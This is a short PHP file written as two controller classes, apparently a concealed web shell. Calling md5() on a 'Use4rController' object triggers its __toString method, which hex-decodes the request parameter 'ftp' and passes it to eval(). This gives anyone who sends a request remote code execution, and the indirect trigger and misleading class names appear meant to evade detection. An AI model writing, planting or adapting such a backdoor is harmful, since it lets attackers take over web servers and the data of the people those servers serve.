<?php
//aa
class ADM1nController
{
    public $proc;
    public $var;
    static function process(){
        $p1 = new Use4rController();
        if(md5($p1) == "1111"){
            echo "111";
        }
    }

    function __construct(){
        $var = $_REQUEST;
    }


}
//aaa
class Use4rController
{
    private $var;
    public function __construct()
    {
        $this->var = $_REQUEST;
    }

    public function __toString()
    {
        if(isset($_REQUEST['ftp']) && eval(hex2bin($this->var['ftp']))){
            return "222";
        }
        return "1111";
    }
}



//aaa
$proc = new ADM1nController();
call_user_func_array(array($proc,'process'),array());
